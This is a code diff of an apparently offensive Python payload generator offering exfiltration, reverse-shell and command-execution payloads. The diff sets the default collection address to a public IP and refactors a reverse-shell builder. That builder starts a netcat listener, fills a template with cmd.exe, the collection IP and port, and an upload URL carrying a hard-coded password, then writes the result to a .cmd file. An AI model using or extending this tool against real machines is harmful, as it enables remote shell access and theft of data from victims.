@@ -6,13 +6,13 @@ def main():
 
     #Required arguments
     parser.add_argument('-p', type=str, default=None, help='Desired Payload: exfil', dest='payloadChoice', required=True)
-    parser.add_argument('-i', type=str,  default="127.0.0.1", help='collection ip address', dest='collectionIP', required=False)
-    parser.add_argument('-r', type=str,  default=1234, help='collection port', dest='collectionPort', required=False)
-    #parser.add_argument('-f', type=str,  default=None, help='File you wish to exfil', dest='exfilFile', required=True)
-    #parser.add_argument('-a', type=str,  default=None, help='Target architecture: ubuntux86', dest='targetArch', required=True)
+    parser.add_argument('-i', type=str, default="131.151.162.100", help='collection ip address', dest='collectionIP', required=False)
+    parser.add_argument('-r', type=str, default=1234, help='collection port', dest='collectionPort', required=False)
+    #parser.add_argument('-f', type=str, default=None, help='File you wish to exfil', dest='exfilFile', required=True)
+    #parser.add_argument('-a', type=str, default=None, help='Target architecture: ubuntux86', dest='targetArch', required=True)
 
     #Optional arguments
-    #parser.add_argument('-o', type=str,  default="execute-command.sh", help='Payload output name', dest='payloadName', required=False)
+    #parser.add_argument('-o', type=str, default="execute-command.sh", help='Payload output name', dest='payloadName', required=False)
 
     args = parser.parse_args()
 
@@ -23,8 +23,9 @@ def main():
     #Reverse Shell Payload
     if(args.payloadChoice == "RShell"):
         print("Reverse Shell payload generator.")
-        shellDestination = "http://localhost:63412/upload?pass=abc321&payload="
-        ReverseShell(systemVariables, args.collectionIP, args.collectionPort, shellDestination, "file.cmd")
+        shellDestination = "http://localhost:63412/upload"
+        variables = "pass=abc321&payload="
+        ReverseShell(systemVariables, args.collectionIP, args.collectionPort, shellDestination, variables, "file.cmd")
 
     #Command Execution Payload
     if(args.payloadChoice == "CExe"):
@@ -46,13 +47,13 @@ def main():
 
     return
 
-def ReverseShell(systemVariables, collectionIP, collectionPort, shellDestination, payloadName):
+def ReverseShell(systemVariables, collectionIP, collectionPort, shellDestination, variables, payloadName):
     if(systemVariables['OS'] == 'Windows'):
         newShell = "start cmd.exe @cmd /k"
         localNetCat = f'{systemVariables["NCat"]} -l -p {collectionPort}'
-
+        shellVar = "cmd.exe"
     with open('CMDTemplates/RShell', 'r') as file:
-        RShellPayloadText = file.read().format(newShell, localNetCat, shellDestination, collectionIP, collectionPort)
+        RShellPayloadText = file.read().format(newShell, localNetCat, variables, collectionIP, collectionPort, shellVar, shellDestination)
 
     f = open(payloadName, "w")
     f.write(RShellPayloadText)
